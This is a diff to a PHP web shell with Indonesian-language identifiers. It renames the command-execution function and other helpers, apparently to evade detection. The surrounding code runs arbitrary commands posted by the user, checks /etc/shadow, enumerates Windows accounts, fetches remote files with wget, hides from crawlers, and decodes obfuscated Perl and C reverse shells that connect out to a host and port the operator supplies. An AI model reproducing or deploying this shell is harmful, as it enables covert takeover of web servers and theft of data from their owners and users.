@@ -30,7 +30,17 @@ if(!function_exists('array_column')){
 		return $array;
 	}
 }
-if(!function_exists("scandir")){function scandir($dir) { $dh = @opendir($dir); while (false !== ($filename = @readdir($dh))){ $files[] = $filename; }return $files;}}
+function listdirs($dir) {
+	if(@is_dir($dir)){
+		if ($handle = @opendir($dir)) {
+			while (($file = @readdir($handle)) !== false) {
+				$files[] = $file;
+			}
+			@closedir($handle);
+		}
+	}	
+	return isset($files) ? $files : [];
+}
 function blockCrawler(){
 	if(!empty($_SERVER['HTTP_USER_AGENT'])){
 		$ua = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
@@ -99,11 +109,11 @@ function serverSecInfo(){
 			$sInfo[] = showInf('Readable /etc/shadow', (@is_readable('/etc/shadow') ? "Yes" : "No"));			
 		}
 	} else {
-		$sInfo[] = showInf('OS Version', base64_decode(cmd("ver", $_SESSION['path'])['stdout']));
+		$sInfo[] = showInf('OS Version', base64_decode(perintahnya("ver", $_SESSION['path'])['stdout']));
 		if(AvFunc(array('iconv'))){
-			$sInfo[] = showInf('Account Settings', @iconv('CP866', 'UTF-8', base64_decode(cmd("net accounts", $_SESSION['path'])['stdout'])));
-			$sInfo[] = showInf('User Accounts', @iconv('CP866', 'UTF-8', base64_decode(cmd("net user", $_SESSION['path'])['stdout'])));
-			$sInfo[] = showInf('System info', @iconv('CP866', 'UTF-8',base64_decode(cmd("systeminfo", $_SESSION['path'])['stdout'])));
+			$sInfo[] = showInf('Account Settings', @iconv('CP866', 'UTF-8', base64_decode(perintahnya("net accounts", $_SESSION['path'])['stdout'])));
+			$sInfo[] = showInf('User Accounts', @iconv('CP866', 'UTF-8', base64_decode(perintahnya("net user", $_SESSION['path'])['stdout'])));
+			$sInfo[] = showInf('System info', @iconv('CP866', 'UTF-8',base64_decode(perintahnya("systeminfo", $_SESSION['path'])['stdout'])));
 		}
 	}
 	return array_values(array_filter(array_unique($sInfo)));
@@ -135,7 +145,7 @@ function transferFile($xurl, $xpath, $xname){
 			$outs[] = file_exists($fName) ? $xname." uploaded!" : $xname." failed!";
 		} else {
 			if(file_exists($fName)){@unlink($fName);}
-			$sendreq = cmd('wget -c '.$xurl.' -O '.$xname, $xpath);
+			$sendreq = perintahnya('wget -c '.$xurl.' -O '.$xname, $xpath);
 			$outs[] = isset($sendreq['stdout']) && strlen($sendreq['stdout'])>2 ? $xname." uploaded!" : $xname." failed!";
 		}
 	} else {
@@ -245,10 +255,10 @@ function cf($f,$t){
 	}
 }
 function expandPath($path) {
-    if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)){ cmd("echo $match[1]", $stdout); return $stdout[0] . $match[2];}
+    if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)){ perintahnya("echo $match[1]", $stdout); return $stdout[0] . $match[2];}
     return $path;
 }
-function cmd($cmdx, $path){
+function perintahnya($cmdx, $path){
     $stdout = '';
 	if(AvFunc(array('chdir'))){
 		if(preg_match("/^\s*cd\s*(2>&1)?$/", $cmdx)){
@@ -344,9 +354,9 @@ function sizeFilter($bytes){
     for($i = 0; $bytes >= 1024 && $i < ( count( $label ) -1 ); $bytes /= 1024, $i++);
     return(round($bytes, 2) . " " . $label[$i]);
 }
-function countDir($filename){return @count(@scandir($filename)) - 2;}
+function countDir($filename){return @count(listdirs($filename)) - 2;}
 function xrmdir($dir){
-	$items = @scandir($dir);
+	$items = listdirs($dir);
 	if($items){
 		foreach($items as $item) {
 			if($item === '.' || $item === '..'){
@@ -358,14 +368,14 @@ function xrmdir($dir){
 		rmdir($dir);
 	}
 }
-function copyDir($source, $destination) {
-    if(!is_dir($source)){
+function gandakanDir($source, $destination) {
+    if(!@is_dir($source)){
         return false;
     }
     if(!file_exists($destination)){
         @mkdir($destination, 0777, true);
     }
-    $items = @scandir($source);
+    $items = listdirs($source);
     foreach($items as $item){
         if ($item === '.' || $item === '..') {
             continue;
@@ -373,7 +383,7 @@ function copyDir($source, $destination) {
         $sourceItem = $source . '/' . $item;
         $destinationItem = $destination . '/' . $item;
         if (@is_dir($sourceItem)) {
-            copyDir($sourceItem, $destinationItem);
+            gandakanDir($sourceItem, $destinationItem);
         } else {
             @copy($sourceItem, $destinationItem);
         }
@@ -381,7 +391,7 @@ function copyDir($source, $destination) {
     return true;
 }
 function urutberkas($a){
-	$b = @scandir($a);
+	$b = listdirs($a);
 	$i = array();
 	if(is_array($b) && count($b)>0){
 		foreach($b as $v){
@@ -429,7 +439,7 @@ function pathberkas($a){
 	}
 	return $outs;
 }
-function filemanager($fm){
+function FManager($fm){
 	$lokasinya = urutberkas($fm);
 	$fmtable = "<div class='col-12'><div class='d-block'>".pathberkas($fm)."</div></div>";
 	$fmtable .= "<div class='col-sm-6 col-md-6 col-lg-4'>
@@ -847,7 +857,7 @@ if(isset($_GET['act'])){
 	} else if($_GET['act'] == 'command'){
 		if(isset($_POST['cmd'])){
 			if(!empty($_POST['cmd']) || strlen($_POST['cmd'])>1){
-				$sendreq = cmd($_POST['cmd'], $_POST['xpath']);
+				$sendreq = perintahnya($_POST['cmd'], $_POST['xpath']);
 				$outs['stdout'] = base64_encode("<pre class='pb-0 mb-0'>". @iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("<span class='text-success font-weight-bold'>".base64_decode($sendreq['userhost']).":</span><span class='text-cyan font-weight-bold'>".base64_decode($sendreq['path'])."</span><span class='text-warning font-weight-bold'>#</span> {$_POST['cmd']}<br/>".htmlspecialchars(base64_decode($sendreq['stdout']))."","\t\0"))."</pre>");
 				$outs['path'] = $sendreq['path'];
 				$outs['userhost'] = $sendreq['userhost'];
@@ -866,11 +876,11 @@ if(isset($_GET['act'])){
 		if(!empty($ndir)){
 			$xpath = $_POST['xpath']."/".$ndir;
 			if($_POST['xtype'] == 'dir'){
-				if(!is_dir($xpath)){
+				if(!@is_dir($xpath)){
 					if(@mkdir($xpath, 0755, true)){
 						$outs = "Direktori berhasil dibuat!";
 					} else {
-						$sendreq = cmd("mkdir ".$xpath, $_POST['xpath']);
+						$sendreq = perintahnya("mkdir ".$xpath, $_POST['xpath']);
 						$outs = isset($sendreq['stdout']) && strlen($sendreq['stdout'])>2 ? "Direktori berhasil dibuat!" : "Gagal membuat direktori!";
 					}
 				} else {
@@ -1036,7 +1046,7 @@ if(isset($_GET['act'])){
 					$outss = $_POST['xname'].' sudah ada!';
 				}
 			} else if($_POST['xtype'] == 'dir'){
-				if(copyDir($df, $target.'/'.$_POST['xname'])){
+				if(gandakanDir($df, $target.'/'.$_POST['xname'])){
 					$outss = $_POST['xname'].' berhasil di copy!';
 				} else {
 					$outss = $_POST['xname'].' gagal di copy!';
@@ -1066,7 +1076,7 @@ if(isset($_GET['act'])){
 					$outss = $_POST['xname'].' sudah ada!';
 				}
 			} else if($_POST['xtype'] == 'dir'){
-				if(is_dir($df)){
+				if(@is_dir($df)){
 					$outss = @rename($df, $target.'/'.$_POST['xname']) ? $_POST['xname'].' berhasil di pindahkan!' : $_POST['xname'].' gagal di pindahkan!';
 				} else {
 					$outss = $df.' tidak ditemukan!';					
@@ -1101,7 +1111,7 @@ if(isset($_GET['act'])){
 		if(file_exists($newname)){
 			unlink($_POST['xpath'].'/'.$newname);
 		}
-		cmd("tar cf {$newname} {$_POST['xname']}", $_POST['xpath']);
+		perintahnya("tar cf {$newname} {$_POST['xname']}", $_POST['xpath']);
 		$outs = file_exists($_POST['xpath']."/".$newname) ? "archived success" : "archived failed";
 		echo $outs;
 		die();
@@ -1112,7 +1122,7 @@ if(isset($_GET['act'])){
 		if(file_exists($newname)){
 			unlink($_POST['xpath'].'/'.$newname);
 		}
-		cmd("tar czf {$newname} {$_POST['xname']}", $_POST['xpath']);
+		perintahnya("tar czf {$newname} {$_POST['xname']}", $_POST['xpath']);
 		$outs = file_exists($_POST['xpath']."/".$newname) ? "archived success" : "archived failed";
 		echo $outs;
 		die();
@@ -1146,7 +1156,7 @@ if(isset($_GET['act'])){
 		die();
 	} else if($_GET['act'] == 'untar'){
 		$df = $_POST['xpath'] .'/'. $_POST['xname'];
-		cmd("tar xf {$_POST['xname']} -C {$_POST['xpath']}", $_POST['xpath']);
+		perintahnya("tar xf {$_POST['xname']} -C {$_POST['xpath']}", $_POST['xpath']);
 		try {
 			$phar = new PharData($_POST['xname']);
 			foreach ($phar as $file) {
@@ -1164,7 +1174,7 @@ if(isset($_GET['act'])){
 		die();
 	} else if($_GET['act'] == 'untgz'){
 		$df = $_POST['xpath'] .'/'. $_POST['xname'];
-		cmd("tar xzf {$_POST['xname']} -C {$_POST['xpath']}", $_POST['xpath']);
+		perintahnya("tar xzf {$_POST['xname']} -C {$_POST['xpath']}", $_POST['xpath']);
 		try {
 			$phar = new PharData($_POST['xname']);
 			foreach ($phar as $file) {
@@ -1233,7 +1243,7 @@ if(isset($_GET['act'])){
 				$Command .= ' '.escapeshellarg($item['name']);
 			}
 		}
-		cmd($Command, $path);
+		perintahnya($Command, $path);
 		echo file_exists($path.'/'.$tarfile) ? "File TAR berhasil dibuat: {$tarfile}" : "Item tidak valid atau tidak ditemukan";
 		die();
 	} else if($_GET['act'] == 'mass_tgz'){
@@ -1247,7 +1257,7 @@ if(isset($_GET['act'])){
 				$Command .= ' '.escapeshellarg($item['name']);
 			}
 		}
-		cmd($Command, $path);
+		perintahnya($Command, $path);
 		echo file_exists($path.'/'.$tgzfile) ? "File TAR.GZ berhasil dibuat: {$tgzfile}" : "Item tidak valid atau tidak ditemukan";
 		die();
 	} else if($_GET['act'] == 'mass_copy'){
@@ -1277,7 +1287,7 @@ if(isset($_GET['act'])){
 					$hasils[] = 'Copy file gagal!';
 				}
 			} else if($item['type'] === 'dir'){
-				if(copyDir($sourcePath, $targetPath)){
+				if(gandakanDir($sourcePath, $targetPath)){
 					$hasils[] = 'Copy dir berhasil!';
 				} else {
 					$hasils[] = 'Copy dir gagal!';
@@ -1314,7 +1324,7 @@ if(isset($_GET['act'])){
 					}
 				}
 			} else if($item['type'] === 'dir'){
-				$isCopyD = copyDir($sourcePath, $targetPath);
+				$isCopyD = gandakanDir($sourcePath, $targetPath);
 				if($isCopyD){
 					xrmdir($sourcePath);
 					$hasils[] = "Cut dir berhasil!";
@@ -1538,7 +1548,7 @@ if(isset($_GET['act'])){
 		$outs = '';
 		if(isset($_POST['xpath'], $_POST['bhost'], $_POST['bport'], $_POST['btype'])){
 			function which($p,$path){
-				$d = cmd('which ' . $p, $path);
+				$d = perintahnya('which ' . $p, $path);
 				if(!empty($d['stdout'])){return $d['stdout'];}
 				return false;
 			}
@@ -1556,7 +1566,7 @@ if(isset($_GET['act'])){
 							$cmdPrompt = '[$]~ ';
 							fputs($sockfd, $cmdPrompt);
 							$command = fgets($sockfd, $GLOBALS['chunk_size']);
-							fputs($sockfd, "".cmd($command, $_POST['xpath'])['stdout']."");
+							fputs($sockfd, "".perintahnya($command, $_POST['xpath'])['stdout']."");
 						}
 						$out .= $sockfd;
 						fclose($sockfd);
@@ -1572,8 +1582,8 @@ if(isset($_GET['act'])){
 					$cf = cf($bcfile, generate("decode", "cjNpMnEybjRyNGw0dTJqNWQ0ZTRuMnY1NjR6NWM0djFuMXE0MDZjNHAzdDNrNDc0czViNHM0ODM0M28xYzJiNGk1aTU1NHY1MzNwNWo0bDUwNjg0NDRtNG40aDRuMnQzOTNtM2IzNTV3MzU0eDNuMjkyeDQ5NmYybDVmNGE0azJyM2YzcTRyNHU1azR5MmEydDNuM3gzcjVjMngzNDM1MzIzbDJqNDM0YzQ3NHA0aTRuNGY0MzRxNTI0bDU0NG80MDRlNHY1bjJ0M2IzcjNmMzc1MTR4MjY0ejNhMmMyYjRpNWk1NTR2NWoybzN4NDg2bzNkNGM0NzRvMmQyZzN6NW00ZjRpNGQ0OTJ0MzkyMjRmNGYyeTM2MzYzczFoMms0ejVsNHM0bzRnNDk0NTRtNHg1dzVnNHg1aDRpNXU0dTVoNW00ODRpMm4ybjRhNHg1ajJoMnoyNDNuMTA2ZjQ5NGM0YTQxNm4yNDVwM2MzajNxNHUzczJoMno0YzN6M2YzejRuNHAzeDNhMjM1bzNuNHY0ODRxM3EzdTNjM2MzeTRvMjgyYzJ2NWo0dzVrNGw0aTJkMjk2ejRwM2E0ZTQ5NHgzZzJoM3I0eDVoNGk0MDNwM3EzYTI5NWc0cTNtMmY0NTN2MTY0aDRtNGg0YzRrNW80ZzJuM3k0ODN3NDkzdTNsMmQydDNuNGk1YTQ5NG00eTNlMjA1MTVuMzY0OTQ3NHgzbzNhM3Y1azR2NW40ZTRvM2wyYzJ5M200ZDJvMmc0dDFtMWY0djU2NHY1ZzJ0M3AzZDN1NHAzMTRlMmYyNjN2M3QzcjNnM3U0YjNvM2MyeTNkNHExejJoNHc1YTR1NXczdzNyM2EzcjNzM3YzMTRjMmEyMjN0M28zMDU3M2wzYTN0M3IzbzJnNHYxcjFqNHg1YjRtNHAyMjVxMzgzYjMzNTA1bDJsM2MyaTRqMjM1ejRnM2kzYjN3M2QybzJnNHQxbTFqNDQ2azQxNjU0ajRoMmsyNDQ5NHE1azRzMm40cDVlMnQyaTR1M2oyejJyMTMzaDVkNHM1bDRsNWwyMzU0NWgzZzNrM3AyMjN3MTMzNzRjNGY0eTU2NHgzbjN1MzkzbzM2NXYzeTM1M3UxcTFrNWk0bjRzNGs1aTJuM3EzcDRuNG4zejRqMmY0"));
 					if($cf){
 						if(which('perl')){
-							$out = cmd("perl {$bcfile} {$_POST['bhost']} {$_POST['bport']} &", $tmpdir);
-							$outs = $out['stdout']."\n".cmd("".generate("decode", "w5s4b234t4r4f296c274i4k5h4p32494n2l4t5")."", $tmpdir)['stdout'];						
+							$out = perintahnya("perl {$bcfile} {$_POST['bhost']} {$_POST['bport']} &", $tmpdir);
+							$outs = $out['stdout']."\n".perintahnya("".generate("decode", "w5s4b234t4r4f296c274i4k5h4p32494n2l4t5")."", $tmpdir)['stdout'];						
 						} else {
 							$outs = 'reverse shell using perl: failed!';						
 						}
@@ -1590,10 +1600,10 @@ if(isset($_GET['act'])){
 					$cf = cf($bcfile, generate("decode", "cjNpNGg0NTRrNG80YjRtNWMyMDNqNHo1NTRxNWY0czI5NDczNjN0MXMzZjRqNDc0dDVyNGM0ZTRuMzIzajRyNDA2MTRrNHM1NTRyNWE0MDYyNGg0NTNyMXUxZTJnNHY1NzRjNGw0ajU2NHAzMDNrNDY0cDRxNWw0bTVxNHMyZDR2NXMyZzRiMzQzbzE5NGc0MTZtM2U0ZTViNHU1bDJwNXU1dDRiMjM0cTRhNGE0MTRjMjM0ODRnNWo0cDNpMjc0ajRjNDM2MjRlNW4yZDJ2NDYzczFnMmgybjNhMjk0ZzQxNm0zNzRoNTEzNTNyMW8zbzNoMmIybDRzNGw0czRrNW80ODJqNHU1NDRzNTE0YTQ1NG40ZzVnNHY1ZTJvNGQ0djU1M3gxdjFuM2EyODJhMmw1ZjU2NHE1aDR1NWwyNTQwNHgyazIxM3gxcDFmMnAzYzI4Mmo0bzVmNDM0ajRmNGY0NDRuNTg0dTVmNGg0dDRwMzczZzJlM3A0MTRkM2szcTQyNTAzMjNvMW8zZDJvM28zczRjNGc0dTJtNGc0djUzNGc0ZjR4NWw0cDMxM2UyOTRwNHc1bDQwNm0yNjRvNHc1ZjRvMmE0eDU5NG00eDM3NGI1aTJ1MzEzNTNyMW8zbzNoMmIybDRoNGg0dDIwNmQ0ZTR6M2c1NTRsNWk0czJrNDQ0aTViNGw1bzRkMjUzcDNmNG00ZTR6NTE0MTQ2NGw1dzVoMmU1azRuNXI0YjU1NDY0azIxM3gxcDFmMnAzYzI4MjY0ajU5Mmk0ODJwNGc0ODRzNWM0MTZtMmEzZTNnNWozcTNpMzM1bTI4MnAzMDVsNGczYzVwMzQ1cjNwNGw0cTNuMmEybDNuM3IzMzVuM28zajNlNXAzbzRrM24yOTI0MzYzdDFwM2UyZDJjMnE1YzRnMnAydjM1NGY0ZzR2NWo1NDR4NWkybTU5NDA0bzNwMm00bTRxNG80YTQxNmMyajRmNGk1YzRpNTQ0YTRqNGQyejNvMnAzazJvNGQ0djVxMmcyczRvNXM0NTRoNG41dTNrNHg1azQxNjg0MDZvM3M0aTQ1NGo0NDRiNGw1bTRoMmgydzMxMzU0aDJlMnM0dTEzM2YycDNlMmQyYzJwM2UyZzJwNGs1azRpNGg0ejV1M2IyazRoNHU1ajRsNWo1dDRiMjg0OTRjNGo0cjNsMnoycDExMzkycDM4MmUyOTJkMnAzZjJ6NWI0cDRwNHo1azRnMngyZTRyMW0xYTJwM20zOTI2NnIxMjNkMm8zbzNoMjc0bjRvNHQybjJuNTg0azI4MjM0aTJnNHAxczE5MmQycDNmMmw1cjRsNHUyeDNjNGM0dDJuM3IyaDIxMzYzMDM5MmwzYTJvMzk0MTZ3NXoyajI4NGM0bjJmMjc0bDJ6MnAxMTM5MnAzODJlMms0dTQwNnI0bTVqNGwyZTI0NDg0aDRuNDI0bDQ4NGEyMjRuNWIydTMxMzUzcjFvM28zaDJiMjU0azRpNHE0bTVrMjY0NDR3MzAzNjNtMXo0"));
 					if($cf){
 						if(which('gcc')){
-							$out = cmd("".generate("decode", "n5c464a2t2i4f244o4d4g42434k582t2l4i4x5u2j594r274")."", $tmpdir);
+							$out = perintahnya("".generate("decode", "n5c464a2t2i4f244o4d4g42434k582t2l4i4x5u2j594r274")."", $tmpdir);
 							@unlink($bcfile);
-							$out = cmd("{$bcfile} {$_POST['bhost']} {$_POST['bport']} &", $tmpdir);
-							$outs = cmd("".generate("decode", "w5s4b234t4r4f296c274i4k5h4p32494")."", $tmpdir)['stdout'];
+							$out = perintahnya("{$bcfile} {$_POST['bhost']} {$_POST['bport']} &", $tmpdir);
+							$outs = perintahnya("".generate("decode", "w5s4b234t4r4f296c274i4k5h4p32494")."", $tmpdir)['stdout'];
 						} else {
 							$outs = 'reverse shell using C: failed!';
 						}
@@ -1718,7 +1728,7 @@ if(isset($_GET['act'])){
 			}
 			echo $dout;
 		} else {
-			echo base64_encode(filemanager($_SESSION['path']));
+			echo base64_encode(FManager($_SESSION['path']));
 		}
 		die();
 	} else if($_GET['act'] == 'logout'){
@@ -1849,8 +1859,6 @@ if(!isset($_SESSION['auth'])){
 						<div class="col-12">
 							<span>Bypass Assistance:</span>
 							<ul class="ml-n4">
-								<li><a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions" target="_blank" class="text-cyan">Linux Restrictions</a></li>
-								<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass" target="_blank" class="text-cyan">PHP - Useful Functions</a></li>
 								<li><a href="https://www.revshells.com/" target="_blank" class="text-cyan">Reverse shell generator</a></li>
 							</ul>
 						</div>
